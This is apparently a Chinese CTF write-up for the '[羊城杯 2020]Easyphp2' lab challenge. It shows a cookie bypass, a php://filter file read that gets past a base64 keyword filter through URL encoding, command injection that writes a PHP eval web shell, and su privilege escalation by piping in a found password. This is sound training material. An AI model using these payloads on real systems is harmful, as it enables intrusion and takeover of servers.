---
title: '[羊城杯 2020]Easyphp2'
date: 2024-09-24 14:45:09
tags: su提权
categories: 刷题笔记
---

## [羊城杯 2020]Easyphp2

我们打开页面，显示404，并有提示，只有来自GWHT的人才能通过

![image-20240924152049225](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241520343.png)

我们想到修改cookie，我们将pass的值修改为GWHT就能进入网站

<!--more-->

![image-20240924152138292](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241521487.png)

给了个提交框后没啥别的信息了，我们发现url传的参数是file，通常这种参数都能用来进行php伪协议

我们尝试输入

```
?file=php://filter/convert.base64-encode/resource=GWHT.php
```

![image-20240924152351611](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241523688.png)

成功报错，说明过滤了什么东西，经过fuzz，我们发现过滤了base64，

我们对base64进行二次解码

```
http://d6fbdc3d-6443-4349-be87-4d7d289f2340.node5.buuoj.cn:81/?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=GWHT.php
```

得到php源码

![image-20240924152834168](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241528197.png)

```
    <?php
    ini_set('max_execution_time', 5);

    if ($_COOKIE['pass'] !== getenv('PASS')) {
        setcookie('pass', 'PASS');
        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');
    }
    ?>


    <?php
    if (isset($_GET["count"])) {
        $count = $_GET["count"];
        if(preg_match('/;|base64|rot13|base32|base16|<\?php|#/i', $count)){
        	die('hacker!');
        }
        echo "<h2>The Count is: " . exec('printf \'' . $count . '\' | wc -c') . "</h2>";
    }
    ?>
```

第一个php的意思是cookie要是GWHT,我们通过了不用管了

第二个php用来rce的

```
简化一下就是这样子，虽然它过滤了<?php但我们可以用<?=代替。
printf '  $count  ' | wc -c

payload：
'|echo "<?= eval(\$_POST['cmd'])?>" |tee a.php|'

合起来就是这样，意思是把shell写入a.php文件里。
printf ''|echo "<?= eval(\$_POST['cmd'])?>" |tee shell
.php | '' | wc -c

```

我们提交payload

成功上传了

![image-20240924153159852](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241531955.png)

我们用蚁剑进行连接

![image-20240924153453324](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241534378.png)

我们用find命令寻找flag

```
find / -name flag*
```

![image-20240924153900661](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241539693.png)

我们打开发现flag.txt里面什么都没有

我们在readme里发现密码

![image-20240924154007281](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241540312.png)

解码后是GWHTCTF

接下来一个就是su提权

直接切换用户不行，因为蚁剑shell不是完整tty

![image-20240924154145098](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241541160.png)

我们利用管道输出符进行传输密码

```
printf "GWHTCTF" | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'
```

得到flag

![image-20240924154234144](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409241542166.png)
